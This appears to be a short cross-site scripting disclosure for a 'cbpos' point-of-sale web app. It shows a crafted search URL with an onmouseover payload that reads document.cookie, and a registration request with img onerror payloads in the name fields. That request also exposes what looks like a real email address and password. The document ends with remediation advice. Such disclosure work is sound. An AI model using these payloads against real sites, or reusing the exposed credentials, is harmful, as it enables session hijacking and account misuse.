Proof Of Concept

Configure a web proxy in your browser.

Navigate to the URL in the browser http://localhost/cbpos/?p=products&search=%3Ch1+onmouseover=confirm(document.cookie)%3Ehii%3C/h1%3E

Fill in the desired data in the input fields. Intercept the request in the web proxy. Modify the Search parameter as shown below and send the request to the server.

search=%3Ch1+onmouseover=confirm(document.cookie)%3Ehii%3C/h1%3E


 navigate to homepage and enter the payload in search permater


firstname=%22%3E%3Cimg+src%3Dxx+onerror%3Dalert(1)%3E&lastname=%22%3E%3Cimg+src%3Dxx+onerror%3Dalert(1)%3E&contact=6280957713&gender=Male&default_delivery_address=ssdfsfs&email=mohit.ahir7086%40gmail.com&password=Ramasra1247%40

Stored XSS attacks can have serious consequences, such as Account takeover by stealing cookies, stealing sensitive data, modifying the content of the web page, or redirecting users to a malicious sites.
Remediation:

Implement proper input validation and output encoding to prevent malicious code from being injected into the web application. Use server-side validation to ensure that user input is properly sanitized before being stored in a database or displayed on a web page. Use output encoding to ensure that any user input that is displayed on the web page is properly encoded to prevent malicious code from being executed.
